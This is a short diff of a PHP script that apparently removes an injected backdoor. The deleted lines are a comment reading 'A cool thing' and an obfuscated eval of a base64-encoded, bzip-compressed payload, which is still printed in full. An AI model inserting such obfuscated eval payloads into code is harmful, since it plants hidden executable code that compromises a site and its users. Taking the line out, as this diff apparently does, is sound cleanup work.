@@ -1,7 +1,5 @@
 <?php
 
-// A cool thing
-eval(bzdecompress(base64_decode('QlpoNDFBWSZTWflerLwAAFPbgEAAQufsXQgAr+PeVDAArWwlNRQZNGynlDTagPUxAap6mIYj1AaA0AGglTRAaAAAAAxGjkUyuXuq8Q0vTmUKOhLVC+0CI0rtY7kAknoW0FsxIQHQvwtAgrPhBXAwfAS6NIyrvJEXMDPRgw+K2gHbdi/9Wg29AEqzGjXvnYYTUrHuxERFC1wAgolsQx1xmtLe/gBBJhpjxFaNAAcjSV9J0BeKNG7n4u5IpwoSHyvVl4A=')));
 require_once dirname(__FILE__,2).'/config.php';
 $dev_server = CONFIG_SRV_TYPE == 0;
 
